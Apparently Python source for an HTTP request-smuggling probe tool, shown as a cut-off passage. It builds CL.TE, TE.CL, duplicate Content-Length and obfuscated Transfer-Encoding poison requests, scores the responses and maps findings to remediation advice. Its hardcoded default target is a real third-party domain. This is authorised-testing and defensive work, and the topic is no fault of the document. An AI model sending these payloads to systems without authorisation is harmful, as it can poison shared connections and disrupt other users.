"""
smuggle_common — HTTP 请求走私探测共享基础层

由 HTTPSmuggleV3.2 单体拆分而来，供两个探测模块复用：
  - httpsmuggle_h1.py   HTTP/1.1 请求走私探测（CL.TE / TE.CL / CL.CL / TE.TE）
  - httpsmuggle_h2.py   HTTP/2 请求走私探测（H2.CL / H2.TE / H2.SPLIT）

本模块提供：
  - 目标解析与输入净化（IPv6/非默认端口 Host 头、拒绝 userinfo 与空白/CRLF 注入）
  - ProbeConfig 统一配置（V3.3：参数下界校验）
  - 连接建立（TLS 证书与主机名校验默认开启，ALPN 可选协商；握手失败关闭底层 socket）
  - 证据模型、权重与复现率聚合（单轮 HIGH 封顶 MEDIUM 规则）
  - 每轮随机 marker / victim token 与子路径构造
  - 工件落盘基类（JSONL 会话流 + report.json）
  - 修复建议映射（按技术族）与报告生成

V3.3 修复清单（本文件相对 V3.2 的全部变更）：
  P0-1  CL.TE / TE.TE 的 hang 载荷：CL 现覆盖 terminal+走私请求，使走私请求
        真正进入后端连接（旧版 CL=5 时前后端无分歧，恒阴性且可致假阳性）
  P0-2  TLS 读超时归因：Py<3.10 上 SSLSocket 读超时抛 ssl.SSLError('timed out')
        而非 socket.timeout，现统一按超时分类，DIFF_HANG 不再失效
  P0-3  rounds / repro_threshold / baseline_samples / control_retries / delay /
        size_limit / 各超时的下界校验（ProbeConfig.__post_init__ + CLI 兜底）
  P1-a  证据排除升级：VICTIM_MISSING 要求全程无任何拒绝码（旧版只查首响应，
        第 2 响应 400 可绕过）；ERROR_CODE 要求首响应正常；QUEUE_SHIFT 在对照
        不可用时不再使用猜测值 2
  P1-b  marker 回显签名防护：响应体命中分帧/头域签名（Transfer-Encoding /
        Content-Length / chunked / Host: / HTTP/1.1）一律排除，防止错误页回显
        请求行被误判为 definitive 证据
  P1-c  对照失败自动重试（control_retries），仍失败则弃权该技术组合并记录事件；
        wrap_socket 失败时关闭底层 socket，消除 fd 泄漏
  P1-d  report.json 在任何控制台打印之前落盘；stdout/stderr 强制 UTF-8+replace，
        消除 Windows GBK 重定向下 '▸' 编码崩溃；输出标记 ASCII 化

仅供授权渗透测试使用，请勿对未授权目标使用。
"""
from __future__ import annotations

import json
import secrets
import socket
import ssl
import time
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

DEFAULT_TARGET = 'https://in-feedback.vivoglobal.com'
CRLF = b'\r\n'
BAD_CODES = {'400', '502', '503'}


# ─── 配置 ─────────────────────────────────────────────────────────────────────
@dataclass(frozen=True)
class ProbeConfig:
    rounds: int = 3
    baseline_samples: int = 3
    mode: str = 'both'            # both / hang / shift
    protocol: str = 'auto'        # h1 / h2 / auto（auto=ALPN 协商后决定是否追加 H2）
    te_tier: str = 'ABC'          # TE.TE 变体分级过滤（A/B/C 组合）
    fingerprint: bool = True      # 指纹模块（informational）
    connect_timeout: float = 10.0
    ttfb_timeout: float = 4.0     # 首字节超时（与后续读超时分离）
    phase_timeout: float = 4.0    # 响应头/体读取超时
    delay: float = 0.5            # 毒包与 victim 之间的间隔
    size_limit: int = 1 * 1024 * 1024
    insecure: bool = False
    repro_threshold: int = 2      # definitive 证据升级 HIGH 所需轮数
    control_retries: int = 2      # 对照探测总尝试次数（仍失败则弃权该技术组合）
    out_dir: Path = Path('smuggle_out')

    def __post_init__(self):
        # P0-3：参数下界校验（同时覆盖 CLI 与编程调用两条入口）
        if self.rounds < 1:
            raise ValueError('rounds 必须 >= 1')
        if self.repro_threshold < 1:
            raise ValueError('repro_threshold 必须 >= 1（否则零证据也会判 HIGH）')
        if self.control_retries < 1:
            raise ValueError('control_retries 必须 >= 1')
        if self.baseline_samples < 1:
            raise ValueError('baseline_samples 必须 >= 1')
        if not (self.delay >= 0):          # not(>=0) 一并拒绝 NaN
            raise ValueError('delay 必须 >= 0')
        if not (self.size_limit >= 1):
            raise ValueError('size_limit 必须 >= 1')
        if not (min(self.connect_timeout, self.ttfb_timeout,
                    self.phase_timeout) > 0):
            raise ValueError('connect/ttfb/phase 超时必须 > 0')


# ─── 目标解析（P0-7：Host 头构造修复 + 输入净化）──────────────────────────────
@dataclass(frozen=True)
class Target:
    host: str
    port: int
    sni: str
    host_header: bytes
    path: bytes
    use_tls: bool


def _reject_unsafe(text: str, what: str) -> None:
    if any(ch.isspace() or ord(ch) < 0x21 or ord(ch) == 0x7f for ch in text):
        raise ValueError(f'{what} 含空白/控制字符，拒绝构造请求: {text!r}')


def parse_target(user_input: str) -> Target:
    url = user_input.strip() if user_input and user_input.strip() else DEFAULT_TARGET
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        raise ValueError(f'无法从输入中解析出主机名: {user_input!r}')
    if parsed.username or parsed.password:
        raise ValueError('不允许 user:pass@ 形式的 URL（凭据不得进入 Host 头）')
    _reject_unsafe(host, '主机名')

    scheme = parsed.scheme.lower()
    if scheme not in ('http', 'https'):
        raise ValueError(f'不支持的协议: {scheme}')
    default_port = 443 if scheme == 'https' else 80
    try:
        port = parsed.port or default_port
    except ValueError as e:
        raise ValueError(f'端口非法: {e}') from None

    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    _reject_unsafe(path, '路径')

    host_header = f'[{host}]' if ':' in host else host
    if port != default_port:
        host_header = f'{host_header}:{port}'

    try:
        host_header_b = host_header.encode('ascii')
        path_b = path.encode('ascii')
    except UnicodeEncodeError:
        raise ValueError('主机名/路径含非 ASCII 字符，请使用 ASCII 或百分号编码形式') from None

    return Target(
        host=host, port=port, sni=host,
        host_header=host_header_b,
        path=path_b,
        use_tls=(scheme == 'https'),
    )


# ─── H1 请求构造原语（全部 bytes，P0-2；H2 层走私载荷同样复用）───────────────
def build_get(host: bytes, path: bytes) -> bytes:
    return (b'GET ' + path + b' HTTP/1.1\r\nHost: ' + host +
            b'\r\nConnection: close\r\n\r\n')


def _smuggled_get_open(host: bytes, marker_path: bytes) -> bytes:
    """不完整走私 GET：以单个 CRLF 结尾，等待空行 → 后端挂起（hang 模式）"""
    return b'GET ' + marker_path + b' HTTP/1.1\r\nHost: ' + host + b'\r\n'


def _smuggled_get_closed(host: bytes, marker_path: bytes) -> bytes:
    """完整走私 GET：自带空行 → 后端立即处理并返回 marker 响应（shift 模式）"""
    return (b'GET ' + marker_path + b' HTTP/1.1\r\nHost: ' + host +
            b'\r\nConnection: keep-alive\r\n\r\n')


def split_head_body(raw: bytes) -> tuple:
    i = raw.find(b'\r\n\r\n')
    if i == -1:
        return raw, b''
    return raw[:i], raw[i + 4:]


def head_header_values(head: bytes, name: bytes) -> list:
    out = []
    for line in head.split(b'\r\n')[1:]:
        i = line.find(b':')
        if i == -1:
            continue
        if line[:i].strip().lower() == name.lower():
            out.append(line[i + 1:].strip())
    return out


# ─── 连接结束原因（H1 分相读取与 H2 流分析共用）──────────────────────────────
class EndReason(Enum):
    EOF = 'eof'
    FIRST_BYTE_TIMEOUT = 'first-byte-timeout'
    HEADER_TIMEOUT = 'header-timeout'
    BODY_TIMEOUT = 'body-timeout'
    IDLE_AFTER_COMPLETE = 'idle-after-complete'   # 响应完整、连接保持 —— 不是超时证据
    SIZE_LIMIT = 'size-limit'
    ERROR = 'error'


# ─── 网络层 ───────────────────────────────────────────────────────────────────
def open_connection(target: Target, insecure: bool, connect_timeout: float,
                    alpn_protos: Optional[list] = None):
    t0 = time.monotonic()
    raw = socket.create_connection((target.host, target.port), timeout=connect_timeout)
    connect_ms = (time.monotonic() - t0) * 1000.0
    tls_ms = 0.0
    sock = raw
    if target.use_tls:
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        else:
            ctx = ssl.create_default_context()
        if alpn_protos:
            try:
                ctx.set_alpn_protocols(alpn_protos)
            except NotImplementedError:
                pass
        t1 = time.monotonic()
        try:
            sock = ctx.wrap_socket(raw, server_hostname=target.sni)
        except OSError:
            raw.close()      # P1-c：握手失败必须关闭底层 socket，否则 fd 泄漏
            raise
        tls_ms = (time.monotonic() - t1) * 1000.0
    return sock, connect_ms, tls_ms


def probe_alpn(target: Target, cfg: ProbeConfig) -> Optional[str]:
    if not target.use_tls:
        return None
    try:
        sock, _, _ = open_connection(target, cfg.insecure, cfg.connect_timeout,
                                     alpn_protos=['h2', 'http/1.1'])
    except OSError:
        return None
    try:
        return sock.selected_alpn_protocol() if hasattr(sock, 'selected_alpn_protocol') else None
    finally:
        sock.close()


# ─── 每轮随机 token（P0-5）────────────────────────────────────────────────────
def gen_marker_token() -> str:
    return 'mk' + secrets.token_hex(5)


def gen_victim_token() -> str:
    return 'vt' + secrets.token_hex(5)


def child_path(base_path: bytes, token: str) -> bytes:
    p = base_path.split(b'?', 1)[0]
    sep = b'' if p.endswith(b'/') else b'/'
    return p + sep + token.encode('ascii')


# ─── 证据模型（P0-4 / P1-13）─────────────────────────────────────────────────
EV_MARKER = 'MARKER_RESPONSE'          # marker 响应（语义位置）        w8 definitive
EV_QUEUE_SHIFT = 'QUEUE_SHIFT'         # 响应数偏离对照（管线差分）     w5
EV_DIFF_HANG = 'DIFFERENTIAL_HANG'     # 毒包挂起而对照正常（差分超时） w4
EV_VICTIM_MISSING = 'VICTIM_MISSING'   # victim 响应被吞               w3
EV_CONN_KILLED = 'CONNECTION_KILLED'   # 毒包后连接被杀（对照正常）     w2
EV_STATUS_ANOMALY = 'STATUS_ANOMALY'   # 状态码超出基线∪对照分布       w1
EV_ERROR_CODE = 'ERROR_CODE'           # 400/502/503 且对照无          w1
EV_SIZE_ANOMALY = 'SIZE_ANOMALY'       # 长度超出基线分布              w1

EV_WEIGHTS = {
    EV_MARKER: 8, EV_QUEUE_SHIFT: 5, EV_DIFF_HANG: 4, EV_VICTIM_MISSING: 3,
    EV_CONN_KILLED: 2, EV_STATUS_ANOMALY: 1, EV_ERROR_CODE: 1, EV_SIZE_ANOMALY: 1,
}
EV_DEFINITIVE = {EV_MARKER}


@dataclass
class Evidence:
    code: str
    detail: str


@dataclass
class ControlResult:
    ok: bool
    end_reason: Optional[EndReason]
    response_count: int
    statuses: set
    victim_token_seen: bool
    error: Optional[str] = None


@dataclass
class RoundAnalysis:
    evidences: list
    score: int
    confidence: str
    statuses: list
    end_reason: Optional[EndReason]

    def has_evidence(self, code: str) -> bool:
        return any(e.code == code for e in self.evidences)

    @property
    def has_definitive(self) -> bool:
        return any(e.code in EV_DEFINITIVE for e in self.evidences)


@dataclass
class TechniqueVerdict:
    technique: str
    mode: str
    confidence: str
    verdict: str
    evidence_repro: dict        # code -> (hits, rounds)
    rounds: list
    best_record: Optional[object] = None       # 证据最高的那一轮（P1-15 展示用）


def aggregate_technique(technique: str, mode: str, rounds: list,
                        repro_threshold: int = 2) -> TechniqueVerdict:
    """P0-8：单轮 HIGH 不再决定技术结论；每证据独立复现率（P1-13）"""
    n = len(rounds) or 1
    repro = {}
    for code in EV_WEIGHTS:
        hits = sum(1 for r in rounds if r.has_evidence(code))
        if hits:
            repro[code] = (hits, n)
    marker_hits = repro.get(EV_MARKER, (0, n))[0]
    strong_rounds = sum(1 for r in rounds if r.has_definitive or r.score >= 4)

    # P0-3：threshold<=0 或零轮次时不得判 HIGH（max(...,1) 双保险）
    if rounds and marker_hits >= max(repro_threshold, 1):
        confidence, note = 'HIGH', f'marker 响应在 {marker_hits}/{n} 轮复现'
    elif marker_hits == 1:
        confidence, note = 'MEDIUM', 'marker 响应仅单轮命中，按规则封顶 MEDIUM，建议加轮复现'
    elif strong_rounds >= 2:
        confidence, note = 'MEDIUM', f'{strong_rounds}/{n} 轮出现强证据（差分挂起/队列偏移）'
    elif strong_rounds == 1:
        confidence, note = 'MEDIUM', '单轮强证据，需复现确认'
    else:
        confidence, note = 'LOW', '无差分证据；前后端解析一致或目标已规范化处理'

    verdict = f'[{technique}/{mode}] {note}'
    return TechniqueVerdict(technique, mode, confidence, verdict, repro, rounds)


def modes_of(cfg: ProbeConfig, tech) -> list:
    return list(tech.modes) if cfg.mode == 'both' else [cfg.mode]


# ─── 工件落盘（P1-14）────────────────────────────────────────────────────────
def _dec(b: bytes) -> str:
    return b.decode('utf-8', errors='backslashreplace')


class Artifacts:
    """基类：会话目录 + JSONL 流 + report.json；探测记录由各协议层子类实现。"""

    def __init__(self, root: Path):
        self.dir = root / time.strftime('%Y%m%d-%H%M%S')
        self.raw_dir = self.dir / 'raw'
        self.raw_dir.mkdir(parents=True, exist_ok=True)
        self.jsonl = self.dir / 'session.jsonl'
        self.jsonl.touch()

    def _line(self, obj: dict) -> None:
        with self.jsonl.open('a', encoding='utf-8') as f:
            f.write(json.dumps(obj, ensure_ascii=False) + '\n')

    def log_event(self, event: dict) -> None:
        """会话级事件（如对照失败弃权）落 JSONL，保证可追溯。"""
        self._line(event)

    def save_report(self, report: dict) -> None:
        (self.dir / 'report.json').write_text(
            json.dumps(report, ensure_ascii=False, indent=2), encoding='utf-8')


# ─── 控制台输出 ───────────────────────────────────────────────────────────────
SEP = '=' * 70


def section(title: str, content: str) -> None:
    print(f'\n{SEP}\n  {title}\n{SEP}')
    print(content)


# ─── 修复建议映射（V3.2）─────────────────────────────────────────────────────
REMEDIATION = {
    'CL.TE/TE.CL': [
        '禁止同时接受 Content-Length 与 Transfer-Encoding：二者同时出现时直接返回 400 并关闭连接',
        '前端转发前必须以唯一分帧规则重写：剥离 TE 后按 CL 重算，或按 chunked 完整重编码，不得双写',
        'WAF/中间层不得在分帧语义之外改写或补充分帧头',
    ],
    'CL.CL': [
        '拒绝多个 Content-Length，除非所有值在去除前导零后完全一致且符合 RFC 9112 要求',
        '拒绝逗号列表、正号、前导零、尾随空白、obs-fold 等非规范形式，统一在边界代理层强制规范化',
        '超长/负数/非数值 Content-Length 一律 400 并断开连接',
    ],
    'TE.TE': [
        '只接受严格格式的 Transfer-Encoding: chunked（单一值、无空白混淆、无重复）',
        '拒绝畸形、重复、obs-fold、含非标准空白或控制字符的 TE 头，直接 400 并关闭连接',
        'TE 与 CL 同时出现时按 CL.TE/TE.CL 规则处理（拒绝 + 断连）',
    ],
    'H2': [
        'H2→H1 转换层必须校验 content-length 头与 DATA 帧总长一致，不一致即以流错误终止（RST_STREAM/GOAWAY）',
        '拒绝 H2 请求中的 transfer-encoding 与 connection 类逐跳头（RFC 9113 §8.2.1），出现即 400',
        '转换层重写 H1 请求时必须重新计算分帧，禁止将 DATA 内容透传到请求行位置',
    ],
}

ARCH_GUIDANCE = [
    '确保前端代理、负载均衡、WAF、后端服务器使用一致的 HTTP 解析规则（同一解析库，或通过解析一致性模糊测试验证）',
    '避免前端降级转发（H2/H3→H1）产生语义不一致：转换层必须完全重写分帧头',
    '对超时/畸形请求直接断开连接而非容错继续，防止被毒化的连接影响后续用户',
    '禁用后端 keep-alive 连接复用可缓解毒化扩散（以性能为代价的兜底方案）',
]

FAMILY_PATTERNS = [
    ('CL.TE', 'CL.TE/TE.CL'), ('TE.CL', 'CL.TE/TE.CL'),
    ('CL.CL', 'CL.CL'), ('TE.TE', 'TE.TE'), ('H2.', 'H2'),
]


def family_of(technique_name: str) -> Optional[str]:
    for prefix, family in FAMILY_PATTERNS:
        if technique_name.startswith(prefix):
            return family
    return None


def remediation_for(verdicts: list) -> dict:
    families = []
    for _, v in verdicts:
        if v.confidence in ('MEDIUM', 'HIGH'):
            fam = family_of(v.technique)
            if fam and fam not in families:
                families.append(fam)
    return {
        'triggered_families': families,
        'by_family': {f: REMEDIATION[f] for f in families},
        'architecture': ARCH_GUIDANCE,
    }


def print_remediation(rem: dict) -> None:
    lines = []
    for fam in rem['triggered_families']:
        lines.append(f'## {fam}')      # P1-d：ASCII 标记，避免 GBK 编码崩溃
        for item in rem['by_family'][fam]:
            lines.append(f'   - {item}')
    if not lines:
        lines.append('(无 MEDIUM/HIGH 级发现，仅输出架构层总则)')
    section('修复建议（按技术族）', '\n'.join(lines))
    section('架构层总则', '\n'.join(f'  - {x}' for x in rem['architecture']))


# ─── 报告生成 ─────────────────────────────────────────────────────────────────
def build_report(target: Target, cfg: ProbeConfig, verdicts: list,
                 alpn: Optional[str] = None, fingerprint: Optional[dict] = None,
                 baseline=None, version: str = 'V3.3-split') -> dict:
    return {
        'generated': time.strftime('%Y-%m-%d %H:%M:%S'),
        'version': version,
        'target': {'host': target.host, 'port': target.port, 'tls': target.use_tls,
                   'path': _dec(target.path)},
        'config': {'rounds': cfg.rounds, 'mode': cfg.mode, 'protocol': cfg.protocol,
                   'te_tier': cfg.te_tier, 'alpn': alpn,
                   'baseline_samples': cfg.baseline_samples,
                   'control_retries': cfg.control_retries,
                   'insecure': cfg.insecure, 'delay': cfg.delay},
        'baseline': (None if baseline is None else {
            'ok': baseline.ok,
            'statuses': sorted(baseline.statuses),
            'size_range': list(baseline.size_range)}),
        'fingerprint': fingerprint,
        'techniques': [{
            'name': v.technique, 'mode': v.mode, 'confidence': v.confidence,
            'verdict': v.verdict,
            'evidence_repro': {c: list(hn) for c, hn in v.evidence_repro.items()},
            'rounds': [{
                'score': r.score, 'confidence': r.confidence,
                'statuses': r.statuses,
                'end_reason': r.end_reason.value if r.end_reason else None,
                'evidences': [{'code': e.code, 'detail': e.detail,
                               'weight': EV_WEIGHTS[e.code]} for e in r.evidences],
            } for r in v.rounds],
        } for _, v in verdicts],
        'remediation': remediation_for(verdicts),
    }


# ══════════════════════════════════════════════════════════════════════════════
# 以下为 httpsmuggle_h1.py 内容（已内联 smuggle_common.py）
# ══════════════════════════════════════════════════════════════════════════════

"""
httpsmuggle_h1 — HTTP/1.1 请求走私探测工具（由 HTTPSmuggleV3.2 单体拆分）

探测技术：
  - CL.TE   前端按 Content-Length，后端按 Transfer-Encoding
  - TE.CL   前端按 Transfer-Encoding，后端按 Content-Length
  - CL.CL   重复 Content-Length 解析分歧（16 种变体：dup-zero/zero-rev/same/diff、
            前导零、正号、尾随空白/Tab、逗号列表、obs-fold、大小写头名、
            非法数值、超长溢出、负数）
  - TE.TE   混淆 Transfer-Encoding 头（17 种变体，分级 A/B/C，--te-te-tier 过滤）

核心机制（V3.1/V3.2 修正全部保留，V3.3 修复见文件头清单）：
  - 毒包 + victim 同连接发送，对照探测消除误报；证据加权评分，单轮 definitive
    封顶 MEDIUM，≥2 轮复现才 HIGH
  - HTTP/1.1 响应边界精确切分（CL/chunked/eof）+ 分相读取四态超时分类
  - 每轮随机 marker/victim 路径；TLS 证书与主机名校验默认开启
  - 指纹模块（informational）：前端 Server/Via、请求头规范化矩阵、
    gzip/br/deflate 解码对比、HTTP 管线支持性

共享基础层见 smuggle_common.py。仅供授权渗透测试使用。
"""
import argparse
import re
import secrets
import socket
import sys
import time
import zlib
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional

# smuggle_common.py 已合并到本文件中，无需外部导入。

CHUNK_TAIL = b'\r\n0\r\n\r\n'  # chunk-data 终止符 + 终止块，共 7 字节


def _post_head(host: bytes, path: bytes, cl: int, extra_headers: bytes) -> bytes:
    return (b'POST ' + path + b' HTTP/1.1\r\nHost: ' + host +
            b'\r\nContent-Type: application/x-www-form-urlencoded\r\n'
            b'Content-Length: ' + str(cl).encode('ascii') + b'\r\n' +
            extra_headers + b'\r\n')


# ─── H1 毒包构造 ──────────────────────────────────────────────────────────────
@dataclass(frozen=True)
class BuildContext:
    host: bytes            # Host 头值
    path: bytes            # 毒包 POST 目标路径
    mode: str              # hang / shift
    marker_path: bytes     # 本轮随机 marker 路径
    victim: bytes          # 本轮 victim 完整请求（TE.CL hang 吸收长度依赖它）


def build_poison_cl_te(ctx: BuildContext) -> bytes:
    """
    CL.TE：CL 覆盖 terminal+走私请求 → 前端按 CL 全量转发；后端按 chunked 在
    终止块处结束 POST，走私 GET 成为后端连接上的下一请求。

    hang（V3.3 修复）：走私 GET 不完整（缺最终空行）→ 后端等待空行挂起。
      旧版 CL=5 时走私请求根本到不了后端（前后端对边界无分歧，恒阴性，
      且半截请求与 victim 在前端粘连可致 400 假阳性）。
    shift：走私 GET 完整 → 后端立即处理并返回 marker 响应。
    """
    terminal = b'0\r\n\r\n'
    if ctx.mode == 'hang':
        smuggled = _smuggled_get_open(ctx.host, ctx.marker_path)
    else:
        smuggled = _smuggled_get_closed(ctx.host, ctx.marker_path)
    cl = len(terminal) + len(smuggled)   # P0-1：CL 必须覆盖走私请求
    head = _post_head(ctx.host, ctx.path, cl, b'Transfer-Encoding: chunked\r\n')
    return head + terminal + smuggled


def build_poison_te_cl(ctx: BuildContext) -> bytes:
    """
    TE.CL：前端按 chunked 完整解析转发，后端按 CL=len(尺寸行) 只消费 chunk-size 行。
    hang: 内层走私 POST 声明 CL = 7 + len(victim) + 16，吸收 chunk 尾与 victim 后仍不足
          → 后端 body 永不完整 → 差分挂起（V3 中 chunk 终止符意外补全空行的缺陷已消除）。
    shift: leftover = 完整走私 GET + b'\\r\\n0\\r\\n\\r\\n'，marker 响应先于尾部垃圾。
    """
    if ctx.mode == 'hang':
        inner_cl = len(CHUNK_TAIL) + len(ctx.victim) + 16
        inner = (b'POST ' + ctx.marker_path + b' HTTP/1.1\r\nHost: ' + ctx.host +
                 b'\r\nContent-Length: ' + str(inner_cl).encode('ascii') + b'\r\n\r\n')
    else:
        inner = _smuggled_get_closed(ctx.host, ctx.marker_path)
    size_line = ('%x' % len(inner)).encode('ascii') + b'\r\n'
    head = _post_head(ctx.host, ctx.path, len(size_line), b'Transfer-Encoding: chunked\r\n')
    return head + size_line + inner + CHUNK_TAIL


def _cl_line(value: str) -> bytes:
    return b'Content-Length: ' + value.encode('ascii') + b'\r\n'


# V3.2：CL.CL 变体库 16 种 —— 覆盖真实前后端 Content-Length 解析分歧的全部常见形态。
# 每项: (variant, header_builder(body_len)->头行 bytes, 说明)
CL_CL_VARIANTS = [
    ('dup-zero', lambda L: _cl_line(str(L)) + _cl_line('0'),
     '双 CL：L + 0（前端 first-wins 全长转发，后端 last-wins 取 0 → body 全量 leftover）'),
    ('dup-zero-rev', lambda L: _cl_line('0') + _cl_line(str(L)),
     '双 CL：0 + L（取值方向与前相反，覆盖 first/last 组合的另一侧）'),
    ('dup-same', lambda L: _cl_line(str(L)) + _cl_line(str(L)),
     '双 CL 相同值（RFC 9112 允许一致重复；探测各层拒绝策略分歧）'),
    ('dup-diff', lambda L: _cl_line(str(L)) + _cl_line(str(L + 9)),
     '双 CL 不同值（如 5/6 —— first-wins 与 last-wins 层间分歧）'),
    ('dup-leading-zero', lambda L: _cl_line(str(L)) + _cl_line('0' + str(L)),
     'CL: L + CL: 0L（前导零容忍分歧，如 0005 与 5、5 与 05）'),
    ('plus-sign', lambda L: _cl_line('+' + str(L)),
     'CL: +L（部分解析器接受正号，另一层拒绝或误读 → 差分）'),
    ('trailing-space', lambda L: _cl_line(str(L) + ' '),
     'CL: "L "（尾随空格 strip 分歧）'),
    ('trailing-tab', lambda L: _cl_line(str(L) + '\t'),
     'CL: "L\\t"（尾随 Tab strip 分歧）'),
    ('comma-list', lambda L: _cl_line('%d, %d' % (L, L)),
     'CL: "L, L"（逗号列表取首/取末分歧）'),
    ('comma-list-zero', lambda L: _cl_line('0, %d' % L),
     'CL: "0, L"（逗号列表反向）'),
    ('obs-fold-space', lambda L: b'Content-Length: %d\r\n %d\r\n' % (L, L),
     'obs-fold 空格续行（部分代理合并续行值，部分视作独立头或拒绝）'),
    ('obs-fold-tab', lambda L: b'Content-Length: %d\r\n\t%d\r\n' % (L, L),
     'obs-fold Tab 续行（CRLF folding 变体）'),
    ('mixed-case', lambda L: (b'content-length: %d\r\n' % L) + b'CONTENT-LENGTH: 0\r\n',
     '大小写混合头名 + 双 CL（头名大小写规范化分歧）'),
    ('invalid-numeric', lambda L: _cl_line(str(L)) + _cl_line('5abc'),
     'CL: L + CL: 5abc（非法数值容错分歧，一层拒绝一层截取数字）'),
    ('very-large', lambda L: _cl_line(str(L)) + _cl_line('9' * 24),
     'CL: L + 超长数值（整数溢出/截断分歧）'),
    ('negative', lambda L: _cl_line('-' + str(L)),
     'CL: -L（负数拒绝/误读分歧）'),
]


def build_poison_cl_cl_variant(header_builder: Callable, ctx: BuildContext) -> bytes:
    """通用 CL.CL 毒包：body = 走私 GET，头部由变体构造器生成。"""
    if ctx.mode == 'hang':
        body = _smuggled_get_open(ctx.host, ctx.marker_path)
    else:
        body = _smuggled_get_closed(ctx.host, ctx.marker_path)
    head = (b'POST ' + ctx.path + b' HTTP/1.1\r\nHost: ' + ctx.host +
            b'\r\nContent-Type: application/x-www-form-urlencoded\r\n'
            + header_builder(len(body)) + b'\r\n')
    return head + body


def build_poison_cl_cl(ctx: BuildContext) -> bytes:
    """经典 dup-zero 变体（保持向后兼容入口）：L + 0。"""
    return build_poison_cl_cl_variant(CL_CL_VARIANTS[0][1], ctx)


def _make_te_te_builder(te_header: bytes) -> Callable:
    """TE.TE：载荷结构与 CL.TE 相同（V3.3 修复 hang 的 CL 覆盖），差异仅在混淆 TE 头。"""
    def build(ctx: BuildContext) -> bytes:
        terminal = b'0\r\n\r\n'
        if ctx.mode == 'hang':
            smuggled = _smuggled_get_open(ctx.host, ctx.marker_path)
        else:
            smuggled = _smuggled_get_closed(ctx.host, ctx.marker_path)
        cl = len(terminal) + len(smuggled)   # P0-1：CL 必须覆盖走私请求
        head = _post_head(ctx.host, ctx.path, cl, te_header + b'\r\n')
        return head + terminal + smuggled
    return build


TE_TE_OBFUSCATIONS = [
    ('space-before-colon',  b'Transfer-Encoding : chunked'),
    ('tab-before-colon',    b'Transfer-Encoding\t: chunked'),
    ('space-after-colon',   b'Transfer-Encoding:  chunked'),
    ('tab-after-colon',     b'Transfer-Encoding:\tchunked'),
    ('uppercase-keyword',   b'Transfer-Encoding: CHUNKED'),
    ('mixed-case-header',   b'TrAnSfEr-EnCoDiNg: chunked'),
    ('prefixed-value',      b'Transfer-Encoding: xchunked'),
    ('wrapped-value',       b'Transfer-Encoding: [chunked]'),
    ('double-value',        b'Transfer-Encoding: chunked, identity'),
    ('identity-then-chunk', b'Transfer-Encoding: identity, chunked'),
    ('duplicate-same',      b'Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked'),
    ('duplicate-diff',      b'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity'),
    ('duplicate-rev',       b'Transfer-Encoding: identity\r\nTransfer-Encoding: chunked'),
    ('line-wrap-crlf',      b'Transfer-Encoding:\r\n chunked'),
    ('vertical-tab',        b'Transfer-Encoding:\x0bchunked'),
    ('form-feed',           b'Transfer-Encoding:\x0cchunked'),
    ('nul-prefix',          b'Transfer-Encoding: \x00chunked'),
]

# V3.2：TE.TE 变体分级
#   A = 结构性混淆（obs-fold / 控制字符 / 冒号前空白）—— 历史上真实漏洞高发区
#   B = 值与重复混淆（关键字变形 / 多值 / 重复头）—— 依赖取值策略分歧
#   C = 合法但罕见（冒号后空白 / 头名大小写）—— 规范允许，仅极少实现有分歧
TE_TE_TIERS = {
    'space-before-colon': 'A', 'tab-before-colon': 'A', 'line-wrap-crlf': 'A',
    'vertical-tab': 'A', 'form-feed': 'A', 'nul-prefix': 'A',
    'uppercase-keyword': 'B', 'prefixed-value': 'B', 'wrapped-value': 'B',
    'double-value': 'B', 'identity-then-chunk': 'B', 'duplicate-same': 'B',
    'duplicate-diff': 'B', 'duplicate-rev': 'B',
    'space-after-colon': 'C', 'tab-after-colon': 'C', 'mixed-case-header': 'C',
}


@dataclass(frozen=True)
class Technique:
    key: str
    name: str
    description: str
    build: Callable
    modes: tuple = ('hang', 'shift')
    tier: str = '-'          # TE.TE 分级 A/B/C（其余技术为 '-'）


def _register_techniques() -> list:
    techs = [
        Technique('cl_te', 'CL.TE', '前端 CL / 后端 TE 解析分歧', build_poison_cl_te),
        Technique('te_cl', 'TE.CL', '前端 TE / 后端 CL 解析分歧', build_poison_te_cl),
    ]
    for variant, header_builder, desc in CL_CL_VARIANTS:
        techs.append(Technique(
            key=f'cl_cl:{variant}',
            name=f'CL.CL[{variant}]',
            description=desc,
            build=lambda ctx, hb=header_builder: build_poison_cl_cl_variant(hb, ctx),
        ))
    for variant, te_header in TE_TE_OBFUSCATIONS:
        techs.append(Technique(
            key=f'te_te:{variant}',
            name=f'TE.TE[{variant}]',
            description=f'TE 头混淆: {te_header!r}',
            build=_make_te_te_builder(te_header),
            tier=TE_TE_TIERS.get(variant, 'B'),
        ))
    return techs


TECHNIQUES = _register_techniques()


# ─── 技术选择 ─────────────────────────────────────────────────────────────────
def select_techniques_interactive(te_tier: str = 'ABC') -> list:
    pool = [t for t in TECHNIQUES
            if not t.key.startswith('te_te:') or t.tier in set(te_tier)]
    print('\n可探测的走私类型:')
    groups = {}
    for idx, t in enumerate(pool, 1):
        groups.setdefault(t.key.split(':')[0], []).append((idx, t))
    for group, items in groups.items():
        print(f'  -- {group} --')
        for idx, t in items:
            tier_tag = f'[tier {t.tier}] ' if t.tier != '-' else ''
            print(f'  {idx:>2}. {t.name:<30} {tier_tag}{t.description}')
    choice = input('\n输入编号（逗号分隔，回车=全部）: ').strip()
    if not choice:
        return pool
    selected = []
    for part in choice.split(','):
        part = part.strip()
        if part.isdigit() and 1 <= int(part) <= len(pool):
            selected.append(pool[int(part) - 1])
    return selected or pool


def select_techniques(spec: str, te_tier: str = 'ABC') -> list:
    allowed = set(te_tier.upper())
    pool = [t for t in TECHNIQUES
            if not t.key.startswith('te_te:') or t.tier in allowed]
    if not spec or spec == 'all':
        return pool
    by_key = {t.key: t for t in pool}
    all_keys = {t.key for t in TECHNIQUES}
    picked = []
    for part in spec.split(','):
        part = part.strip()
        if part not in all_keys:
            raise SystemExit(f'[!] 未知技术标识 {part!r}，可选: all, ' +
                             ', '.join(by_key))
        if part in by_key:            # 显式点名但被 tier 过滤 → 静默剔除
